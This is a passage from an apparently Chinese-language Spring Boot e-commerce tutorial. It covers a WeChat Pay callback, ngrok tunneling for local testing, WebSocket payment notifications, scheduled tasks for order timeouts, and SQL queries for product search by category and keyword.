resp<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"appid"</span><span class="token punctuation">,</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"appid"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"result_code"</span><span class="token punctuation">,</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token class-name">WXPayUtil</span><span class="token punctuation">.</span><span class="token function">mapToXml</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="2-4-2-设置回调URL"><a href="#2-4-2-设置回调URL" class="headerlink" title="2.4.2 设置回调URL"></a>2.4.2 设置回调URL</h6><blockquote><p>在订单接口中申请支付连接的时候将回调接口的路径设置给微信支付平台</p></blockquote><table><thead><tr><th>OrderController</th></tr></thead><tbody><tr><td><img src="imgs/1620354502982.png" alt="1620354502982"></td></tr></tbody></table><p>思考：如果按照上图所示的配置，当用户支付成功之后，微信支付平台会向（<code>http://192.168.55.3:8080/pay/callback</code>）发送请求，因为我们的服务端项目是运行在本地计算机的（IP为内网IP），微信平台没办法访问 —— 内网穿透</p><h4 id="21-5-Ngrok实现内网穿透"><a href="#21-5-Ngrok实现内网穿透" class="headerlink" title="21.5 Ngrok实现内网穿透"></a>21.5 Ngrok实现内网穿透</h4><h6 id="21-5-1-注册帐号，申请隧道ID"><a href="#21-5-1-注册帐号，申请隧道ID" class="headerlink" title="21.5.1 注册帐号，申请隧道ID"></a>21.5.1 注册帐号，申请隧道ID</h6><ul><li><p>注册  <a href="http://www.ngrok.cc/">www.ngrok.cc</a></p></li><li><p>开通隧道</p><p><img src="imgs/1620358137613.png" alt="1620358137613"></p></li></ul><ul><li><p>获取隧道ID：118c7bfe1ac90369</p><p><img src="imgs/1620358235596.png" alt="1620358235596"></p></li></ul><h6 id="21-5-2-下载ngrok客户端"><a href="#21-5-2-下载ngrok客户端" class="headerlink" title="21.5.2 下载ngrok客户端"></a>21.5.2 下载ngrok客户端</h6><ul><li><a href="https://ngrok.cc/download.html">https://ngrok.cc/download.html</a></li></ul><h6 id="21-5-3-启动客户端"><a href="#21-5-3-启动客户端" class="headerlink" title="21.5.3 启动客户端"></a>21.5.3 启动客户端</h6><p><img src="imgs/1620358461548.png" alt="1620358461548"></p><p>访问<code>http://ytao.free.idcfengye.com</code>就相当于访问本地的8080</p><h4 id="21-6-前端通过轮询访问获取订单支付状态"><a href="#21-6-前端通过轮询访问获取订单支付状态" class="headerlink" title="21.6 前端通过轮询访问获取订单支付状态"></a>21.6 前端通过轮询访问获取订单支付状态</h4><ul><li><p>流程图</p><p><img src="imgs/1620370021967.png" alt="1620370021967"></p></li><li><p>接口实现</p></li><li><p>前端轮询访问接口</p></li></ul><h4 id="21-7-webSocket消息推送"><a href="#21-7-webSocket消息推送" class="headerlink" title="21.7 webSocket消息推送"></a>21.7 webSocket消息推送</h4><h6 id="21-7-1-实现流程"><a href="#21-7-1-实现流程" class="headerlink" title="21.7.1 实现流程"></a>21.7.1 实现流程</h6><p><img src="imgs/1620372584016.png" alt="1620372584016"></p><h6 id="21-7-2-创建webSocket服务器"><a href="#21-7-2-创建webSocket服务器" class="headerlink" title="21.7.2 创建webSocket服务器"></a>21.7.2 创建webSocket服务器</h6><ul><li><p>添加依赖</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-websocket<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>添加websocket服务节点配置（Java配置方式）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WebSocketConfig</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">ServerEndpointExporter</span> <span class="token function">getServerEndpointExporter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ServerEndpointExporter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>创建websocket服务器</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@ServerEndpoint</span><span class="token punctuation">(</span><span class="token string">"/webSocket/{oid}"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WebSocketServer</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ConcurrentHashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">Session</span><span class="token punctuation">&gt;</span></span> sessionMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcurrentHashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**前端发送请求建立websocket连接，就会执行@OnOpen方法**/</span>    <span class="token annotation punctuation">@OnOpen</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token keyword">open</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathParam</span><span class="token punctuation">(</span><span class="token string">"oid"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> orderId<span class="token punctuation">,</span> <span class="token class-name">Session</span> session<span class="token punctuation">)</span><span class="token punctuation">{</span>        sessionMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>orderId<span class="token punctuation">,</span>session<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">/**前端关闭页面或者主动关闭websocket连接，都会执行close**/</span>    <span class="token annotation punctuation">@OnClose</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathParam</span><span class="token punctuation">(</span><span class="token string">"oid"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> orderId<span class="token punctuation">)</span><span class="token punctuation">{</span>        sessionMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">sendMsg</span><span class="token punctuation">(</span><span class="token class-name">String</span> orderId<span class="token punctuation">,</span><span class="token class-name">String</span> msg<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">Session</span> session <span class="token operator">=</span> sessionMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>            session<span class="token punctuation">.</span><span class="token function">getBasicRemote</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sendText</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="21-7-3-在支付回调接口，通过订单id获取session返回结果"><a href="#21-7-3-在支付回调接口，通过订单id获取session返回结果" class="headerlink" title="21.7.3 在支付回调接口，通过订单id获取session返回结果"></a>21.7.3 在支付回调接口，通过订单id获取session返回结果</h6><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/pay"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PayController</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">OrderService</span> orderService<span class="token punctuation">;</span>    <span class="token comment">/**     * 回调接口:当用户支付成功之后，微信支付平台就会请求这个接口，将支付状态的数据传递过来     */</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/callback"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">paySuccess</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"--------------------callback"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 1.接收微信支付平台传递的数据（使用request的输入流接收）</span>        <span class="token class-name">ServletInputStream</span> is <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuilder</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">=</span> is<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            builder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bs<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token class-name">String</span> s <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//使用帮助类将xml接口的字符串装换成map</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> map <span class="token operator">=</span> <span class="token class-name">WXPayUtil</span><span class="token punctuation">.</span><span class="token function">xmlToMap</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token operator">!=</span><span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token string">"success"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"result_code"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//支付成功</span>            <span class="token comment">//2.修改订单状态为“待发货/已支付”</span>            <span class="token class-name">String</span> orderId <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"out_trade_no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> i <span class="token operator">=</span> orderService<span class="token punctuation">.</span><span class="token function">updateOrderStatus</span><span class="token punctuation">(</span>orderId<span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"--orderId:"</span><span class="token operator">+</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//3.通过websocket连接，向前端推送消息</span>            <span class="token class-name">WebSocketServer</span><span class="token punctuation">.</span><span class="token function">sendMsg</span><span class="token punctuation">(</span>orderId<span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//4.响应微信支付平台</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> resp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"return_code"</span><span class="token punctuation">,</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"return_msg"</span><span class="token punctuation">,</span><span class="token string">"OK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"appid"</span><span class="token punctuation">,</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"appid"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"result_code"</span><span class="token punctuation">,</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token class-name">WXPayUtil</span><span class="token punctuation">.</span><span class="token function">mapToXml</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="21-7-4-前端进入到支付页面时，就建立websocket连接"><a href="#21-7-4-前端进入到支付页面时，就建立websocket连接" class="headerlink" title="21.7.4 前端进入到支付页面时，就建立websocket连接"></a>21.7.4 前端进入到支付页面时，就建立websocket连接</h6><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//前端发送websocket连接请求</span><span class="token keyword">var</span> webSocketUrl <span class="token operator">=</span> webSocketBaseUrl <span class="token operator">+</span> <span class="token string">"webSocket/"</span><span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>orderInfo<span class="token punctuation">.</span>orderId<span class="token punctuation">;</span><span class="token keyword">var</span> websocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span> webSocketUrl <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//只要后端通过websocket向此连接发消息就会触发onmessage事件</span>websocket<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> msg <span class="token operator">=</span> event<span class="token punctuation">.</span>data<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>msg<span class="token operator">==</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#div1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">"&lt;label style='font-size:20px; color:green'&gt;订单支付完成！&lt;/label&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二十二、订单超时取消"><a href="#二十二、订单超时取消" class="headerlink" title="二十二、订单超时取消"></a>二十二、订单超时取消</h2><blockquote><p>订单超时取消，指的是当用户成功提交订单之后在规定时间内没有完成支付，则将订单关闭还原库存。</p><p>实现订单的超时取消业务通常有两种解决方案：</p><ul><li>定时任务（quartz）</li><li>延时队列（MQ）</li></ul></blockquote><h4 id="22-1-实现流程"><a href="#22-1-实现流程" class="headerlink" title="22.1 实现流程"></a>22.1 实现流程</h4><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1620437778182.png" alt="1620437778182"></td></tr></tbody></table><h4 id="22-2-quartz定时任务框架使用"><a href="#22-2-quartz定时任务框架使用" class="headerlink" title="22.2 quartz定时任务框架使用"></a>22.2 quartz定时任务框架使用</h4><h6 id="22-2-1-添加依赖"><a href="#22-2-1-添加依赖" class="headerlink" title="22.2.1 添加依赖"></a>22.2.1 添加依赖</h6><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-quartz<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h6 id="22-2-2-创建定时任务"><a href="#22-2-2-创建定时任务" class="headerlink" title="22.2.2 创建定时任务"></a>22.2.2 创建定时任务</h6><blockquote><p>定时任务，每隔指定的时间就执行一次任务</p><p>案例：每隔3s就打印一次Helloworld</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PrintHelloWorldJob</span> <span class="token punctuation">{</span>    <span class="token comment">//https://cron.qqe2.com</span>    <span class="token annotation punctuation">@Scheduled</span><span class="token punctuation">(</span>cron <span class="token operator">=</span> <span class="token string">"0/3 * * * * ?"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">printHelloWorld</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"----hello world."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="22-2-3-在启动类开启定时任务"><a href="#22-2-3-在启动类开启定时任务" class="headerlink" title="22.2.3 在启动类开启定时任务"></a>22.2.3 在启动类开启定时任务</h6><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@SpringBootApplication</span><span class="token annotation punctuation">@EnableScheduling</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">QuartzDemoApplication</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">QuartzDemoApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="22-3-实现订单超时取消"><a href="#22-3-实现订单超时取消" class="headerlink" title="22.3 实现订单超时取消"></a>22.3 实现订单超时取消</h4><h6 id="22-3-1-在service子工程添加spring-boot-starter-quartz依赖"><a href="#22-3-1-在service子工程添加spring-boot-starter-quartz依赖" class="headerlink" title="22.3.1 在service子工程添加spring-boot-starter-quartz依赖"></a>22.3.1 在service子工程添加spring-boot-starter-quartz依赖</h6><h6 id="22-3-2-在api自动启动类添加-EnableScheduling注解"><a href="#22-3-2-在api自动启动类添加-EnableScheduling注解" class="headerlink" title="22.3.2 在api自动启动类添加@EnableScheduling注解"></a>22.3.2 在api自动启动类添加@EnableScheduling注解</h6><h2 id="二十三、按类别查询商品"><a href="#二十三、按类别查询商品" class="headerlink" title="二十三、按类别查询商品"></a>二十三、按类别查询商品</h2><h4 id="23-1-流程分析"><a href="#23-1-流程分析" class="headerlink" title="23.1 流程分析"></a>23.1 流程分析</h4><p><img src="imgs/1620457488174.png" alt="1620457488174"></p><h4 id="23-2-接口开发"><a href="#23-2-接口开发" class="headerlink" title="23.2 接口开发"></a>23.2 接口开发</h4><h6 id="23-2-1-根据类别查询商品接口"><a href="#23-2-1-根据类别查询商品接口" class="headerlink" title="23.2.1 根据类别查询商品接口"></a>23.2.1 根据类别查询商品接口</h6><ul><li><p>数据库分析及SQL</p></li><li><p>数据库实现</p><table><thead><tr><th>实体类</th></tr></thead><tbody><tr><td><img src="imgs/1620612762250.png" alt="1620612762250"></td></tr></tbody></table><table><thead><tr><th>ProductMapper接口</th></tr></thead><tbody><tr><td><img src="imgs/1620612889581.png" alt="1620612889581"></td></tr><tr><td><img src="imgs/1620613618026.png" alt="1620613618026"></td></tr></tbody></table><table><thead><tr><th>ProductSkuMapper</th></tr></thead><tbody><tr><td><img src="imgs/1620613678148.png" alt="1620613678148"></td></tr><tr><td><img src="imgs/1620613704249.png" alt="1620613704249"></td></tr></tbody></table></li><li><p>业务层实现</p></li></ul><ul><li>控制层实现</li></ul><h6 id="23-2-2-根据类别ID查询当前类别下所有商品的品牌"><a href="#23-2-2-根据类别ID查询当前类别下所有商品的品牌" class="headerlink" title="23.2.2 根据类别ID查询当前类别下所有商品的品牌"></a>23.2.2 根据类别ID查询当前类别下所有商品的品牌</h6><ul><li><p>SQL</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">-- 查询统计某个类别下所有商品的品牌：SQLselect DISTINCT brand from product_params where product_id in (select product_id from product where category_id=49)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>数据库实现</p><table><thead><tr><th>ProductMapper接口</th></tr></thead><tbody><tr><td><img src="imgs/1620628043376.png" alt="1620628043376"></td></tr></tbody></table><table><thead><tr><th>映射配置</th></tr></thead><tbody><tr><td><img src="imgs/1620629298116.png" alt="1620629298116"></td></tr></tbody></table></li><li><p>Service实现</p></li><li><p>Controller实现</p></li></ul><h4 id="23-3-前端实现"><a href="#23-3-前端实现" class="headerlink" title="23.3 前端实现"></a>23.3 前端实现</h4><h2 id="二十四、商品搜索"><a href="#二十四、商品搜索" class="headerlink" title="二十四、商品搜索"></a>二十四、商品搜索</h2><h4 id="24-1-流程分析"><a href="#24-1-流程分析" class="headerlink" title="24.1 流程分析"></a>24.1 流程分析</h4><p><img src="imgs/1620630004787.png" alt="1620630004787"></p><h4 id="24-2-接口实现"><a href="#24-2-接口实现" class="headerlink" title="24.2 接口实现"></a>24.2 接口实现</h4><h6 id="24-2-1-模糊查询商品信息"><a href="#24-2-1-模糊查询商品信息" class="headerlink" title="24.2.1 模糊查询商品信息"></a>24.2.1 模糊查询商品信息</h6><ul><li><p>数据库实现</p><table><thead><tr><th>ProductMapper</th></tr></thead><tbody><tr><td><img src="imgs/1620630773945.png" alt="1620630773945"></td></tr></tbody></table><table><thead><tr><th>映射配置</th></tr></thead><tbody><tr><td><img src="imgs/1620630584762.png" alt="1620630584762"></td></tr></tbody></table></li><li><p>Service实现</p><table><thead><tr><th>ProductServiceImpl</th></tr></thead><tbody><tr><td><img src="imgs/1620631035060.png" alt="1620631035060"></td></tr></tbody></table></li><li><p>Controller实现</p></li></ul><h6 id="24-2-2-根据关键字查询对应商品的品牌"><a href="#24-2-2-根据关键字查询对应商品的品牌" class="headerlink" title="24.2.2 根据关键字查询对应商品的品牌"></a>24.2.2 根据关键字查询对应商品的品牌</h6><ul><li><p>SQL</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 根据关键字查询对应商品的品牌名称</span><span class="token keyword">select</span> <span class="token keyword">DISTINCT</span> brand <span class="token keyword">from</span> product_params <span class="token keyword">where</span> product_id <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token keyword">select</span> product_id <span class="token keyword">from</span> product <span class="token keyword">where</span> product_name <span class="token operator">like</span> <span class="token string">'%小%'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>数据库实现</p><table><thead><tr><th>ProductMapper</th></tr></thead><tbody><tr><td><img src="imgs/1620631751389.png" alt="1620631751389"></td></tr></tbody></table><table><thead><tr><th>映射配置</th></tr></thead><tbody><tr><td><img src="imgs/1620631839638.png" alt="1620631839638"></td></tr></tbody></table></li><li><p>Service实现</p><table><thead><tr><th>ProductServiceImpl</th></tr></thead><tbody><tr><td><img src="imgs/1620632012254.png" alt="1620632012254"></td></tr></tbody></table></li><li><p>Controller实现</p></li></ul><h4 id="24-3-前端实现"><a href="#24-3-前端实现" class="headerlink" title="24.3 前端实现"></a>24.3 前端实现</h4><h2 id="二十五、用户中心"><a href="#二十五、用户中心" class="headerlink" title="二十五、用户中心"></a>二十五、用户中心</h2><h4 id="25-1-用户中心登录校验"><a href="#25-1-用户中心登录校验" class="headerlink" title="25.1 用户中心登录校验"></a>25.1 用户中心登录校验</h4><h6 id="25-1-1-校验token接口实现"><a href="#25-1-1-校验token接口实现" class="headerlink" title="25.1.1 校验token接口实现"></a>25.1.1 校验token接口实现</h6><ul><li>UserController</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span><span class="token string">"校验token是否过期接口"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/check"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token 